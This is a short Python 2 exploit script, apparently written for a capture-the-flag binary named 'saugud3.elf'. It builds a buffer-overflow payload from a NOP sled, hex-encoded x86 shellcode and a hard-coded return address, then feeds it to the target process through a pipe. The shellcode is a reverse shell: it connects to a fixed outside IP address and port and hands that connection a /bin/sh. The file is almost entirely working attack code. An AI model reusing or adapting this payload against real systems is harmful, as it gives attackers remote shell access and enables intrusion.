#!/usr/bin/python2

from subprocess import Popen , PIPE
from time import sleep
from struct import pack

exec_shell = "\x31\xc0\x89\xc3\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xc0\x89\xc3\xb0\x66\xb3\x03\x68\x4d\xba\xbc\x01\x66\x68\xd6\xd9\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"

shellcode = ''
shellcode += '\x90'*( 200 - len(exec_shell)) # nopsled
shellcode += exec_shell # shellcode
shellcode += '\x90'*72 # nopsled
shellcode += pack('I', 0x80b79d3 ) # jmp ecx

# opens gdb with parameter executable
# you can also manage stdout and stderr here
#proc = Popen( ['nc'] , bufsize=1 ,stdin=PIPE )
#proc = Popen( ['gdb' , './saugud3.elf'] , bufsize=1 ,stdin=PIPE )
proc = Popen( ['./saugud3.elf'] , bufsize=1 ,stdin=PIPE )

# sample breakpoint
# notice the new line after each command
#proc.stdin.write('b *0x08048de0\n')
#sleep(0.5)
# any other commands go here

# this is a loop, will get every command and pass it to GDB
# "leave" == quit GDB and terminate process
# "dump"  == paste shellcode
while True:
    mycommand = raw_input()
    if (mycommand == "leave"):
        # quit gdb
        proc.stdin.write("quit\n")
        break

    # paste shellcode
    if (mycommand == "d"):
        proc.stdin.write(shellcode)
        sleep(0.5)

    # not a custom command? send it as-is
    else:
        mycommand = mycommand + '\n'
        proc.stdin.write(mycommand)
        sleep(0.5)

# close our pipe
proc.stdin.close()
proc.wait()
